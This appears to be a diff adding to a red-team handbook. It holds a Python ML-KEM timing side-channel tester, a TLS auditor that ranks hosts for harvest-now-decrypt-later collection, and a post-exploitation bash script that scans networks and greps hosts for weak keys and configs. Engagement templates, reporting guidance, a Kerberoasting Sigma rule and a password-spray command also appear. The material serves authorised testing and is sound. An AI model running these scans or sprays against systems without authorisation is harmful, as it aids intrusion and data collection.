+        valid_times.append(t_valid)
+        
+        # Invalid ciphertext (random bytes, same length)
+        invalid_ct = bytes(np.random.randint(0, 256, len(ciphertext), dtype=np.uint8))
+        t_invalid = timing_oracle_mlkem(invalid_ct, kem)
+        invalid_times.append(t_invalid)
+    
+    return {
+        'valid':   valid_times,
+        'invalid': invalid_times
+    }
+
+
+def analyze_timing_leakage(data: dict) -> None:
+    """
+    Statistical analysis of timing measurements.
+    Welch's t-test to detect significant timing differences.
+    Effect size (Cohen's d) quantifies leakage magnitude.
+    """
+    if not data:
+        return
+    
+    valid   = np.array(data['valid'])
+    invalid = np.array(data['invalid'])
+    
+    print("\n[*] === TIMING ANALYSIS RESULTS ===")
+    print(f"    Valid   decap: mean={np.mean(valid):.1f}ns  std={np.std(valid):.1f}ns")
+    print(f"    Invalid decap: mean={np.mean(invalid):.1f}ns  std={np.std(invalid):.1f}ns")
+    print(f"    Timing delta:  {abs(np.mean(valid) - np.mean(invalid)):.1f}ns")
+    
+    # Welch's t-test (unequal variance, appropriate for timing data)
+    t_stat, p_value = stats.ttest_ind(valid, invalid, equal_var=False)
+    print(f"\n    Welch's t-test: t={t_stat:.4f}, p={p_value:.2e}")
+    
+    # Cohen's d (effect size)
+    pooled_std = np.sqrt((np.std(valid)**2 + np.std(invalid)**2) / 2)
+    cohens_d   = abs(np.mean(valid) - np.mean(invalid)) / pooled_std
+    print(f"    Cohen's d (effect size): {cohens_d:.4f}")
+    
+    # Interpretation
+    if p_value < 0.001 and cohens_d > 0.2:
+        print("\n    [!!!] SIGNIFICANT TIMING LEAK DETECTED")
+        print(f"    [!!!] Effect size {cohens_d:.4f} is exploitable with enough samples")
+        print(f"    [!!!] Estimated key recovery: ~{int(5000/cohens_d):,} measurements")
+    elif p_value < 0.05:
+        print("\n    [~] Marginal timing difference detected: may not be exploitable")
+    else:
+        print("\n    [OK] No statistically significant timing difference detected")
+    
+    # Visualize
+    plt.figure(figsize=(12, 5))
+    
+    plt.subplot(1, 2, 1)
+    plt.hist(valid,   bins=50, alpha=0.7, label='Valid ciphertext',   color='blue')
+    plt.hist(invalid, bins=50, alpha=0.7, label='Invalid ciphertext', color='red')
+    plt.xlabel('Decapsulation time (ns)')
+    plt.ylabel('Count')
+    plt.title('ML-KEM Timing Distribution')
+    plt.legend()
+    
+    plt.subplot(1, 2, 2)
+    plt.boxplot([valid, invalid], labels=['Valid', 'Invalid'])
+    plt.ylabel('Decapsulation time (ns)')
+    plt.title('Box Plot Comparison')
+    
+    plt.tight_layout()
+    plt.savefig('mlkem_timing_analysis.png', dpi=150)
+    print("\n[*] Plot saved: mlkem_timing_analysis.png")
+
+
+def audit_target_tls_for_quantum_vulnerability(target_host: str, target_port: int = 443) -> dict:
+    """
+    Audit a TLS endpoint: detect quantum-vulnerable cipher suites and key types.
+    Returns dict of findings.
+    """
+    import ssl
+    import socket
+    
+    findings = {
+        'host':    target_host,
+        'port':    target_port,
+        'cipher':  None,
+        'version': None,
+        'cert_key_type': None,
+        'cert_key_bits': None,
+        'quantum_vulnerable': None,
+        'sndl_priority': None,
+    }
+    
+    try:
+        ctx = ssl.create_default_context()
+        ctx.check_hostname = False
+        ctx.verify_mode = ssl.CERT_NONE
+        
+        with socket.create_connection((target_host, target_port), timeout=10) as sock:
+            with ctx.wrap_socket(sock, server_hostname=target_host) as ssock:
+                cipher     = ssock.cipher()
+                version    = ssock.version()
+                cert_der   = ssock.getpeercert(binary_form=True)
+                
+                findings['cipher']  = cipher[0] if cipher else None
+                findings['version'] = version
+                
+                # Parse certificate for key type
+                from cryptography import x509
+                from cryptography.hazmat.primitives.asymmetric import rsa, ec, ed25519
+                
+                cert = x509.load_der_x509_certificate(cert_der)
+                pub_key = cert.public_key()
+                
+                if isinstance(pub_key, rsa.RSAPublicKey):
+                    findings['cert_key_type'] = 'RSA'
+                    findings['cert_key_bits'] = pub_key.key_size
+                    findings['quantum_vulnerable'] = True
+                    findings['sndl_priority'] = 1  # Highest
+                    
+                elif isinstance(pub_key, ec.EllipticCurvePublicKey):
+                    findings['cert_key_type'] = 'ECDSA'
+                    findings['cert_key_bits'] = pub_key.key_size
+                    findings['quantum_vulnerable'] = True
+                    findings['sndl_priority'] = 2
+                    
+                elif isinstance(pub_key, ed25519.Ed25519PublicKey):
+                    findings['cert_key_type'] = 'Ed25519'
+                    findings['cert_key_bits'] = 256
+                    findings['quantum_vulnerable'] = True  # Shor's on discrete log
+                    findings['sndl_priority'] = 2
+                    
+                else:
+                    findings['cert_key_type'] = type(pub_key).__name__
+                    findings['quantum_vulnerable'] = False
+                    findings['sndl_priority'] = 5  # PQC: not worth collecting
+    
+    except Exception as e:
+        findings['error'] = str(e)
+    
+    return findings
+
+
+if __name__ == "__main__":
+    import sys
+    
+    if len(sys.argv) > 1:
+        # Audit mode: python3 pqc_sidechannel.py target.com
+        target = sys.argv[1]
+        port   = int(sys.argv[2]) if len(sys.argv) > 2 else 443
+        
+        print(f"[*] Auditing {target}:{port} for quantum vulnerability...")
+        findings = audit_target_tls_for_quantum_vulnerability(target, port)
+        
+        print(f"\n    Host:       {findings['host']}")
+        print(f"    TLS:        {findings.get('version', 'N/A')}")
+        print(f"    Cipher:     {findings.get('cipher', 'N/A')}")
+        print(f"    Cert key:   {findings.get('cert_key_type', 'N/A')} "
+              f"{findings.get('cert_key_bits', '')} bits")
+        print(f"    Quantum vulnerable: {findings.get('quantum_vulnerable', 'N/A')}")
+        print(f"    SNDL priority: {findings.get('sndl_priority', 'N/A')} "
+              f"(1=highest, 5=not worth collecting)")
+    
+    else:
+        # Timing analysis mode
+        print("[*] ML-KEM Timing Side-Channel Analysis")
+        print("[*] Mode: local Kyber768 implementation test")
+        data = collect_timing_samples(n_samples=2000)
+        analyze_timing_leakage(data)
+```
+
+---
+
+### 3.5 CRYPTOGRAPHIC INVENTORY SCRIPT
+
+```bash
+#!/bin/bash
+# quantum-audit.sh: Scan internal infrastructure for quantum-vulnerable crypto
+# Run during post-exploitation to identify SNDL-priority assets
+
+TARGET_RANGE="${1:-10.0.0.0/24}"
+OUTPUT_FILE="quantum_inventory_$(date +%Y%m%d).txt"
+
+echo "[*] Quantum Vulnerability Audit - $(date)" | tee "$OUTPUT_FILE"
+echo "[*] Target: $TARGET_RANGE" | tee -a "$OUTPUT_FILE"
+echo "----------------------------------------" | tee -a "$OUTPUT_FILE"
+
+# ===== TLS CERTIFICATE SCAN =====
+echo "[*] Scanning for RSA/ECDSA TLS certificates..." | tee -a "$OUTPUT_FILE"
+
+# Requires: nmap with ssl-cert script
+nmap -p 443,8443,8080,8000,4443 \
+     --open \
+     --script ssl-cert,ssl-enum-ciphers \
+     -oG - "$TARGET_RANGE" 2>/dev/null | \
+while read line; do
+    host=$(echo "$line" | grep -oP '(?<=Host: )\S+' | head -1)
+    cert=$(echo "$line" | grep -i "rsa\|ecdsa\|ec\|Public Key")
+    if [[ -n "$cert" ]]; then
+        echo "  [TLS] $host - $cert" | tee -a "$OUTPUT_FILE"
+    fi
+done
+
+# ===== SSH KEY AUDIT =====
+echo "[*] Scanning for quantum-vulnerable SSH keys..." | tee -a "$OUTPUT_FILE"
+
+# Check local system
+find /etc /home /root -name "authorized_keys" 2>/dev/null | while read f; do
+    grep -l "ssh-rsa\|ecdsa-sha2" "$f" 2>/dev/null && \
+    echo "  [SSH] Vulnerable key in: $f" | tee -a "$OUTPUT_FILE"
+done
+
+# Check SSH host keys
+ls /etc/ssh/ssh_host_*_key.pub 2>/dev/null | while read f; do
+    keytype=$(cat "$f" | awk '{print $1}')
+    if [[ "$keytype" == "ssh-rsa" || "$keytype" == "ecdsa-sha2-nistp256" ]]; then
+        echo "  [SSH HOST] Quantum-vulnerable host key: $f ($keytype)" | tee -a "$OUTPUT_FILE"
+    fi
+done
+
+# ===== CERTIFICATE STORE AUDIT =====
+echo "[*] Auditing certificate store for RSA/ECDSA certs..." | tee -a "$OUTPUT_FILE"
+
+# Linux certificate store
+find /etc/ssl/certs /usr/share/ca-certificates 2>/dev/null -name "*.pem" -o -name "*.crt" | \
+while read cert; do
+    keytype=$(openssl x509 -in "$cert" -noout -text 2>/dev/null | grep "Public Key Algorithm")
+    if echo "$keytype" | grep -qi "rsaEncryption\|ecPublicKey\|id-ecPublicKey"; then
+        echo "  [CERT] $cert - $keytype" | tee -a "$OUTPUT_FILE"
+    fi
+done
+
+# ===== JWT / API TOKENS IN CONFIG FILES =====
+echo "[*] Searching for RS256/ES256 JWT usage in config files..." | tee -a "$OUTPUT_FILE"
+
+grep -r "RS256\|ES256\|RS384\|ES384\|RS512\|ES512\|\"alg\":\"RS\|\"alg\":\"ES" \
+    /etc /opt /var /home /srv 2>/dev/null | \
+grep -v Binary | head -50 | tee -a "$OUTPUT_FILE"
+
+# ===== VPN CONFIG =====
+echo "[*] Checking VPN configurations for quantum-vulnerable settings..." | tee -a "$OUTPUT_FILE"
+
+# OpenVPN
+grep -r "auth RSA\|cipher RSA\|tls-cipher.*RSA\|tls-cipher.*ECDSA" \
+    /etc/openvpn 2>/dev/null | tee -a "$OUTPUT_FILE"
+
+# IPsec / StrongSwan
+grep -r "esp=aes.*!\|ike=.*rsa\|ike=.*ecdsa" \
+    /etc/ipsec.conf /etc/strongswan.conf /etc/swanctl 2>/dev/null | tee -a "$OUTPUT_FILE"
+
+# WireGuard (not quantum-vulnerable but document)
+find /etc/wireguard -name "*.conf" 2>/dev/null | while read f; do
+    echo "  [WG] WireGuard config found: $f (Curve25519 KEM: quantum-vulnerable)" | tee -a "$OUTPUT_FILE"
+done
+
+echo "" | tee -a "$OUTPUT_FILE"
+echo "[*] Audit complete. Results saved to: $OUTPUT_FILE" | tee -a "$OUTPUT_FILE"
+echo "[*] Priority for SNDL collection:" | tee -a "$OUTPUT_FILE"
+echo "    P1: RSA key exchange / RSA certificates" | tee -a "$OUTPUT_FILE"
+echo "    P2: ECDSA / ECDH / Ed25519" | tee -a "$OUTPUT_FILE"
+echo "    P3: WireGuard (Curve25519)" | tee -a "$OUTPUT_FILE"
+echo "    P5: ML-KEM / ML-DSA: skip, already PQC" | tee -a "$OUTPUT_FILE"
+```
+
+---
+
+## SECTION 4: RED TEAM OPERATIONS
+
+---
+
+### 4.1 PRE-ENGAGEMENT - SCOPING QUESTIONNAIRE
+
+```markdown
+# Red Team Pre-Engagement Questionnaire
+**Version:** 2027 | Operator: [YOUR NAME] | Client: [CLIENT]
+
+---
+
+## SECTION A: OBJECTIVES & SUCCESS CRITERIA
+
+1. What is the PRIMARY objective of this engagement?
+   [ ] Demonstrate path to Domain Admin
+   [ ] Demonstrate ransomware scenario (encrypt + exfil)
+   [ ] Simulate a named threat actor (specify: ____________)
+   [ ] Test specific control (specify: ____________)
+   [ ] Test incident response / detection capabilities
+   [ ] Full kill chain (initial access → objective)
+
+2. What constitutes "success" for you at the end of this engagement?
+   (open answer: align expectations now)
+   _______________________________________________
+
+3. Are results being shared with: [ ] Board  [ ] CISO  [ ] IT  [ ] Insurance  [ ] All
+
+---
+
+## SECTION B: SCOPE
+
+4. IP ranges in scope (list all):
+   _______________________________________________
+
+5. Domains in scope:
+   _______________________________________________
+
+6. Cloud accounts in scope:
+   [ ] AWS Account IDs: ___________________________
+   [ ] Azure Tenant/Subscription: _________________
+   [ ] GCP Project IDs: __________________________
+   [ ] M365 Tenant: ______________________________
+
+7. Physical locations in scope:
+   [ ] HQ: _______________________________________
+   [ ] Branch offices (list): _____________________
+   [ ] Data centers: ______________________________
+   [ ] All of the above
+
+8. Personnel in scope for social engineering:
+   [ ] All employees
+   [ ] Specific departments (specify): _____________
+   [ ] Executives only
+   [ ] Helpdesk / IT only
+   [ ] None
+
+---
+
+## SECTION C: OUT-OF-SCOPE
+
+9. Explicitly out-of-scope IP ranges / systems:
+   (production databases, payment systems, specific servers)
+   _______________________________________________
+
+10. Out-of-scope personnel (C-suite personal devices, legal, HR specifics):
+    _______________________________________________
+
+11. Any systems with zero tolerance for disruption?
+    (manufacturing control, hospital patient systems, trading systems)
+    _______________________________________________
+
+---
+
+## SECTION D: PERMITTED TECHNIQUES
+
+12. Phishing:
+    [ ] Email phishing: ALL employees
+    [ ] Email phishing: specific departments only
+    [ ] Credential harvesting only (no payload delivery)
+    [ ] Full payload delivery permitted
+    [ ] Spear phishing (named targets): ___________
+    [ ] NOT permitted
+
+13. Vishing (phone phishing):
+    [ ] Permitted: all employees
+    [ ] Permitted: helpdesk / IT only
+    [ ] NOT permitted
+
+14. Physical testing:
+    [ ] Permitted: ALL listed locations
+    [ ] Permitted: HQ only
+    [ ] Badge cloning permitted
+    [ ] Hardware implant deployment permitted
+    [ ] Physical implant retrieval within engagement window
+    [ ] NOT permitted
+
+15. Destructive testing:
+    [ ] File encryption simulation (ransomware)
+    [ ] Data deletion simulation
+    [ ] Service disruption / DoS
+    [ ] None of the above
+
+16. Data exfiltration simulation:
+    [ ] Simulated exfil (log + hash, don't move real data)
+    [ ] Sample real data exfil (define max size): _____
+    [ ] Full exfil simulation permitted
+    
+17. C2 / Implant persistence:
+    [ ] Implants may remain through engagement window
+    [ ] Implants must be removed within 24 hours of discovery
+    [ ] All implants listed and removed at engagement end
+
+---
+
+## SECTION E: AUTHORIZATION & EMERGENCY CONTACTS
+
+18. Authorizing executive:
+    Name: _________________ Title: ________________
+    Signature required: YES (attach signed authorization letter)
+    
+19. Emergency contact (can call off the engagement immediately):
+    Name: _________________ Mobile: _______________
+
+20. Security team contact (if testing is detected):
+    Name: _________________ Mobile: _______________
+    Email: _________________ 
+    
+    Protocol if detected:
+    [ ] Security team calls off: you stop immediately
+    [ ] Security team investigates: you continue (purple mode)
+    [ ] Testing continues regardless of detection: notify us post-engagement
+
+21. Escalation path if operator discovers real criminal activity
+    (insider threat, active malware not planted by your team):
+    _______________________________________________
+
+22. Engagement dates:
+    Start: _____________ End: _____________
+    Testing hours:
+    [ ] 24/7
+    [ ] Business hours only (define: _______________)
+    [ ] After hours only
+```
+
+---
+
+### 4.2 RULES OF ENGAGEMENT - DOCUMENT TEMPLATE
+
+```markdown
+# Rules of Engagement (ROE)
+**Classification:** CONFIDENTIAL
+**Engagement:** [CLIENT NAME] Red Team Assessment
+**Date Range:** [START] to [END]
+**Operator Organization:** [YOUR ORG]
+
+---
+
+## AUTHORIZATION
+
+This document authorizes [OPERATOR ORG] and the following named individuals:
+- [OPERATOR 1 NAME]: [ID/Passport Number]
+- [OPERATOR 2 NAME]: [ID/Passport Number]
+
+...to conduct adversarial security testing activities against [CLIENT NAME]
+as described herein, during the period [START DATE] to [END DATE].
+
+Authorized by:
+Name: _________________________
+Title: _________________________
+Signature: _________________________
+Date: _________________________
+
+> **CARRY THIS DOCUMENT DURING ALL PHYSICAL TESTING**
+> **THIS IS WHAT PREVENTS ARREST**
+
+---
+
+## IN-SCOPE
+
+### Technical
+- IP Ranges: [LIST]
+- Domains: [LIST]
+- Cloud Environments: [LIST]
+- Email Phishing: [YES/NO + SCOPE]
+- Vishing: [YES/NO + SCOPE]
+- Payload Delivery: [YES/NO]
+
+### Physical
+- Locations: [LIST ADDRESSES]
+- Entry Methods: tailgating, pretext, RFID cloning [AS AGREED]
+- Hardware Implants: [YES/NO + TYPES]
+- Duration of Implants: [DEFINE]
+
+---
+
+## OUT-OF-SCOPE
+
+[EXPLICIT LIST: be specific, include IP ranges]
+
+---
+
+## EMERGENCY PROCEDURES
+
+**Immediate Stop Signal:**
+If client contacts operator with phrase: "[AGREED CODEWORD]"
+→ Operator ceases ALL activity immediately
+→ Operator does NOT remove or destroy evidence before stopping
+→ Operator contacts [EMERGENCY CONTACT] within 15 minutes
+
+**If Operator is Detained:**
+Contact [CLIENT SECURITY CONTACT]: [PHONE]
+Reference: "I am a contracted security tester. Authorization letter attached."
+Do not speak to law enforcement without contacting [CLIENT LEGAL]: [PHONE]
+
+---
+
+## DATA HANDLING
+
+- All data obtained during testing: stored encrypted (AES-256)
+- Access: named operators only
+- Retention: 90 days post-engagement, then destroyed (certificate provided)
+- Exfiltrated data: [DESCRIBED METHOD: hashed/sample only/full]
+- C2 callback domains: [LIST], to be added to allowlist for post-engagement analysis
+```
+
+---
+
+### 4.3 RED TEAM REPORT STRUCTURE
 
 ```markdown
 # Red Team Assessment Report
-#### [CLIENT NAME] | [DATE RANGE] | CONFIDENTIAL
+**Classification:** CONFIDENTIAL - ATTORNEY-CLIENT PRIVILEGED
+**Client:** [CLIENT NAME]
+**Engagement Period:** [START] to [END]
+**Report Date:** [DATE]
+**Operator:** [OPERATOR NAME / ORG]
 
 ---
 
-#### EXECUTIVE SUMMARY (2 pages max, for C-suite)
-- What was tested (one paragraph)
-- Critical findings count: X Critical, Y High, Z Medium
-- Key narrative: "Testers achieved Domain Admin in 4 hours from external phishing"
-- Business risk: what an actual attacker could have done
-- Top 3 recommendations
+## EXECUTIVE SUMMARY (Max 2 Pages: Written for C-Suite)
 
-#### ATTACK NARRATIVE (most important section)
-Tell the story chronologically. Executives read this.
-Shows real attack path, not a list of vulns.
+### What Was Tested
+[One paragraph, plain language, no jargon]
 
-Day 1 - External Reconnaissance:
-- Found exposed VPN portal via Shodan
-- Identified employee credentials in breach database (BreachForum data)
-- Successful password spray against 3 accounts
+### Critical Findings At a Glance
+| Severity | Count | Most Critical Example |
+|----------|-------|-----------------------|
+| Critical | X     | Domain Admin via phishing in 4 hours |
+| High     | X     | 3 accounts with admin rights and weak passwords |
+| Medium   | X     | MFA not enforced on VPN |
+| Low      | X     | Outdated TLS ciphers on 4 servers |
 
-Day 1-2 - Initial Access:
-- Phishing campaign: 847 emails sent, 23 clicked, 8 submitted credentials
-- One credential: helpdesk_svc with Domain Admin rights (finding F-001)
+### Business Risk Statement
+If a real threat actor had conducted this engagement, they would have been
+able to: [SPECIFIC, NON-JARGON IMPACT: "access payroll data for all 2,400
+employees" not "achieve persistence in the HR network segment"]
 
-Day 2 - Lateral Movement:
-- DCSync executed: all domain hashes extracted
-- Golden ticket created: persistent admin access
-
-Day 3-5 - Objective Completion:
-- Accessed target data store: [SENSITIVE DATA TYPE] exfiltrated
-- Simulated ransomware: encryption keys escrowed for proof
+### Top 3 Recommendations (Immediate Action)
+1. [ACTION - OWNER - TIMELINE]
+2. [ACTION - OWNER - TIMELINE]
+3. [ACTION - OWNER - TIMELINE]
 
 ---
 
-#### FINDINGS (technical detail)
+## ATTACK NARRATIVE (Most Important Section)
 
-### F-001: Excessive Privilege on Service Account [CRITICAL]
-**CVSS:** 9.8 (AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H)
-**MITRE ATT&CK:** T1078.002
+### Why It Exists
+Executives read this. It tells the story of what happened, chronologically,
+in plain language. Not a list of vulnerabilities, but a story of an attack.
+
+### The Story
+
+**Day 1: External Reconnaissance (Passive)**
+[What you found and how]
+"Starting from nothing but the client's domain name, our team identified
+43 email addresses via LinkedIn enumeration, 3 exposed management interfaces
+via Shodan, and credentials for 2 accounts in public breach databases."
+
+**Day 1-2: Initial Access**
+"We launched a targeted phishing campaign against 12 employees in the Finance
+department. The emails appeared to come from [CLIENT]'s IT department and
+requested a password reset via a cloned login portal. Within 6 hours, 4
+employees submitted credentials. One account (helpdesk_svc) had
+Domain Admin rights assigned."
+
+**Day 2-3: Persistence & Lateral Movement**
+[Step by step, chronological, plain language]
+
+**Day 3-5: Objective Completion**
+[What was accessed, what was simulated, proof]
+
+---
+
+## TECHNICAL FINDINGS
+
+### Finding F-001: [TITLE] - [SEVERITY]
+
+**CVSS Score:** X.X (Vector: AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H)
+**MITRE ATT&CK:** [TECHNIQUE ID + NAME]
+**Business Risk:** [ONE SENTENCE, BUSINESS LANGUAGE]
 
 **Description:**
-helpdesk_svc account has Domain Admin membership despite its role
-requiring only password reset permissions.
+[What is wrong, in 2-3 sentences]
 
 **Evidence:**
-[SCREENSHOT of group membership]
-[COMMAND OUTPUT showing privileges]
+[Screenshot reference / command output: redacted if sensitive]
 
-**Business Impact:**
-Any compromise of helpdesk_svc → immediate Domain Admin.
-This account was reachable via password spray with a common password.
-
-**Reproduction:**
-1. Password spray: crackmapexec smb 10.0.0.1 -u helpdesk_svc -p 'Summer2024!'
-2. Confirm DA: net group "Domain Admins" /domain
+**Reproduction Steps:**
+1. [Step]
+2. [Step]
+3. [Result]
 
 **Remediation:**
-- Remove helpdesk_svc from Domain Admins immediately
-- Apply principle of least privilege: grant only password reset rights
-- Implement strong password policy for service accounts
-- Enable fine-grained password policy for service accounts: minimum 20 chars
+1. [Immediate action: 24-48 hours]
+2. [Short-term: 1 week]
+3. [Long-term: 1 month]
 
 **References:**
-- MITRE ATT&CK T1078.002
-- CIS Benchmark for Active Directory, Section 1.1
+- MITRE ATT&CK: [URL]
+- Vendor advisory: [URL if applicable]
 
 ---
 
-#### REMEDIATION ROADMAP
+## REMEDIATION ROADMAP
 
-| Priority | Finding | Owner | Timeline | Effort |
-|----------|---------|-------|----------|--------|
-| Immediate | F-001 DA service account | IT Security | 24 hours | Low |
-| Week 1 | F-003 MFA not enforced on VPN | IT | 1 week | Medium |
-| Month 1 | F-007 Patch management | IT Ops | 4 weeks | High |
+| Priority | ID | Finding | Owner | Timeline | Est. Effort |
+|----------|----|---------|-------|----------|-------------|
+| Immediate | F-001 | DA service account | IT Security | 24h | 2h |
+| Week 1 | F-003 | MFA on VPN | IT | 1 week | Medium |
+| Month 1 | F-007 | Patch management | IT Ops | 4 weeks | High |
 
-#### APPENDIX
-- Full tool list and commands used
-- IOCs generated (implant hashes, C2 domains), for exclusion from future monitoring
-- Scope confirmation signed documents
-- Testing methodology
+---
+
+## APPENDIX
+
+A. Scope confirmation and signed authorization
+B. Full tool list and commands used during engagement
+C. IOCs generated by this engagement (implant hashes, C2 domains)
+   → Provide to SOC for exclusion from production monitoring
+D. Testing methodology reference
+E. Engagement timeline (all activities, timestamped)
 ```
+
+---
+
+### 4.4 C-SUITE DEBRIEF - HOW TO PRESENT
+
+```
+THE ROOM: CISO + CFO + GC + potentially CEO
+Three different people who care about three different things.
+One room. One shot. Get it right.
+
+---
+
+CISO CARES ABOUT:
+  What controls failed and why
+  What detection gaps exist
+  What the attacker's dwell time would have been
+  What to fix first to reduce the most risk
+  
+SPEAK TO CISO IN:
+  Technical narrative (brief: they'll read the full report)
+  Control gaps: "Your EDR had signatures but no behavioral detection"
+  Dwell time: "We maintained access for 6 days before detection"
+  Fix priority: "The one change that stops the critical path is X"
+
+---
+
+CFO CARES ABOUT:
+  What this costs the company if a real attacker did it
+  Regulatory / compliance exposure
+  Insurance implications
+  Cost of remediation vs cost of incident
+  
+SPEAK TO CFO IN:
+  Dollar figures (estimate): "Ransomware at this level → $2-8M ransom demand
+    plus $1-3M incident response plus regulatory fine exposure of $X"
+  Compliance framing: "SOC 2 requirement [X] is not met; audit risk is real"
+  ROI framing: "Fixing the top 3 findings costs ~$50K. The alternative: $5M+"
+
+---
+
+GC (GENERAL COUNSEL) CARES ABOUT:
+  Regulatory exposure (GDPR, HIPAA, SOC 2, SEC cyber rules)
+  Privilege protection: "Is this report protected?"
+  Breach notification obligation trigger risk
+  Litigation risk if an incident occurs after this report was received
+  
+SPEAK TO GC IN:
+  "The data accessed during this simulation constitutes [TYPE] under [REGULATION]"
+  "Had this been a real breach, notification obligation would be triggered in [X] days"
+  "Remediation of [FINDING] addresses [REGULATION] Requirement [X]"
+  Confirm: this report was commissioned under attorney-client privilege?
+    (If yes: engagement should have been instructed through legal)
+    (If no: the report may be discoverable in future litigation)
+
+---
+
+DEBRIEF STRUCTURE (60 minutes total):
+
+00:00 - 10:00 | Objective and story
+  "Let me tell you what we did in plain language before we get into details."
+  Walk through attack narrative verbally: no slides with technical terms
+  Stop at key decision points: "This is where a real attacker would have stopped
+  to do X, and nobody would have known they were there"
+
+10:00 - 25:00 | Critical findings (top 3 only)
+  One finding per 5 minutes
+  Business risk first, technical explanation second
+  Remediation: specific, owner-named, time-bound
+
+25:00 - 40:00 | Remediation roadmap
+  The table. Owner each item. Get commitment in the room.
+  "Who owns this? By when? What do you need from us to start today?"
+
+40:00 - 55:00 | Questions
+  Technical questions → answer, offer to follow up in writing
+  Budget/insurance questions → refer to CFO section language
+  Legal questions → ensure GC has the privilege point resolved
+
+55:00 - 60:00 | Re-test commitment
+  "We recommend re-testing the top 3 findings in 60 days.
+  That confirms remediation landed correctly and gives you documentation
+  that you responded to findings, which is important for insurance and compliance."
+
+---
+
+THINGS NEVER TO SAY IN A DEBRIEF:
+  "Your security is terrible" → "We found significant gaps between your 
+    assumed security posture and actual control effectiveness"
+  "This was easy" → "The attack path was achievable within our engagement window"
+  "Anyone could have done this" → "A motivated threat actor with moderate 
+    capability would have achieved similar results"
+  "We owned your whole network" → "We achieved our primary objective of Domain 
+    Admin access and demonstrated the ability to access [SPECIFIC BUSINESS DATA]"
+```
+
+---
+
+### 4.5 PURPLE TEAM INTEGRATION
+
+```
+WHAT PURPLE TEAM IS:
+  Red team and blue team working simultaneously:
+  Red attacks → Blue observes → Blue tells Red what they saw → Red adapts
+  Result: both teams learn. Detection improves in real time.
+
+STANDARD RED-THEN-BLUE (traditional):
+  Red team attacks → report → blue team responds to report
+  Problem: blue team learns about attacks from a document, not from experience
+
+PURPLE TEAM (2027 standard for mature clients):
+  Step 1: Red executes one specific technique (e.g., Kerberoasting)
+  Step 2: Blue team says: "Did we see it? What alert fired? What log entry?"
+  Step 3: Red and blue together: "Here's exactly what we generated. 
+          Here's the Zeek log. Here's the Windows event ID."
+  Step 4: If blue missed it: "Here's the detection rule you need"
+  Step 5: Red confirms detection rule fires. Blue confirms it's in SIEM.
+  Repeat for each technique.
+
+PURPLE TEAM EXECUTION DOCUMENT:
+
+For each technique:
+| Technique | ATT&CK ID | Tool Used | Expected Log/Alert | Blue Saw It? | Rule Added |
+|-----------|-----------|-----------|---------------------|--------------|------------|
+| Kerberoasting | T1558.003 | Rubeus | Event 4769 (SPN query) | YES/NO | YES/NO |
+| LSASS Dump | T1003.001 | Mimikatz | Event 10 (Sysmon) | YES/NO | YES/NO |
+
+KEY PRINCIPLE:
+  If blue can't see it, it needs a detection rule.
+  If blue can see it, verify the alert produces an actionable ticket.
+  If it produces a ticket, verify the ticket has an owner.
+  If it has no owner: the detection is theater.
+
+SIGMA RULE EXAMPLE (provide to blue team during purple):
+title: Kerberoasting - Suspicious SPN Requests
+id: 6a67d0c6-3e97-4b98-b4e7-8e9cf6e5c7d3
+status: experimental
+description: Detects high volume of TGS requests for service accounts
+author: Red Team Operator
+date: 2027-01-01
+logsource:
+    product: windows
+    service: security
+detection:
+    selection:
+        EventID: 4769
+        TicketEncryptionType: '0x17'  # RC4: weak encryption, Kerberoasting indicator
+    timeframe: 5m
+    condition: selection | count() by AccountName > 5
+falsepositives:
+    - Legitimate automated service account usage
+level: high
+tags:
+    - attack.credential_access
+    - attack.t1558.003
+```
+
+---
+
+### 4.6 RE-TEST METHODOLOGY
+
+```
+PURPOSE:
+  Verify that remediation actions actually fixed the reported findings.
+  Provide documentation that the organization responded to findings.
+  Required by: SOC 2, PCI DSS 11.4, ISO 27001, many cyber insurance policies.
+
+RE-TEST SCOPE:
+  ONLY the specific findings from the original report.
+  NOT a full re-engagement.
+  Duration: typically 1-3 days depending on finding count.
+
+RE-TEST TIMELINE:
+  Schedule: 45-90 days after original report delivery
+  Minimum: allow 30 days for remediation to be implemented and verified internally
+  Maximum: don't wait more than 6 months, as the environment changes
+
+RE-TEST METHODOLOGY PER FINDING:
+
+For each original finding:
+
+1. REPRODUCE THE ATTACK (test if still vulnerable):
+   Execute the exact same reproduction steps from the original report.
+   Document: PASS (still vulnerable) or FAIL (now remediated).
+
+2. VERIFY THE FIX (confirm the right fix was applied):
+   Don't just verify "it doesn't work anymore."
+   Verify the ROOT CAUSE was addressed.
+   Example: If finding was "LSASS accessible via Mimikatz":
+   - WRONG verification: run Mimikatz → it fails → mark as fixed
+   - RIGHT verification: confirm LSA Protection is enabled,
+     confirm Credential Guard is running, then run Mimikatz
+   
+3. TEST FOR COMPENSATION CONTROLS:
+   If the exact finding was fixed, are there adjacent vulnerabilities?
+   Example: Password spray finding → client added MFA → does MFA apply to ALL endpoints?
+            Test: try password spray on VPN, OWA, Azure portal separately
+
+4. RE-TEST REPORT STRUCTURE:
+   For each finding:
+   
+   ### F-001 RE-TEST: Domain Admin Service Account
+   **Original finding:** helpdesk_svc had Domain Admin rights
+   **Remediation claimed:** Removed DA membership, applied least privilege
+   
+   **Re-test steps:**
+   1. net group "Domain Admins" /domain → helpdesk_svc NOT present ✓
+   2. Verify new permissions: can reset passwords only, cannot read LSASS ✓
+   3. Attempted password spray → account locked after 5 attempts (new policy) ✓
+   
+   **Result: REMEDIATED** ✓
+   **Evidence:** [Screenshot]
+   
+   ---
+   
+   ### F-003 RE-TEST: MFA Not Enforced on VPN
+   **Original finding:** VPN portal accepted credentials without MFA
+   **Remediation claimed:** MFA enforced via Duo
+   
+   **Re-test steps:**
+   1. Attempt VPN login with credentials only → prompted for Duo ✓
+   2. Attempt VPN login without enrolled device → rejected ✓
+   3. Bypass attempt: VPN web portal (alternate endpoint) → also requires Duo ✓
+   4. Check: does Duo enforce on ALL VPN profiles or only primary? 
+      → Found: legacy "SSL-VPN" profile still without MFA → NOT FULLY REMEDIATED ✗
+   
+   **Result: PARTIALLY REMEDIATED** ⚠
+   **Remaining exposure:** [Detail]
+   **Recommendation:** Apply Duo to legacy SSL-VPN profile
+
+RE-TEST REPORT SUMMARY TABLE:
+| Finding | Original Severity | Status | Notes |
+|---------|------------------|--------|-------|
+| F-001 | Critical | ✓ REMEDIATED | |
+| F-002 | High | ✓ REMEDIATED | |
+| F-003 | High | ⚠ PARTIAL | Legacy VPN profile still exposed |
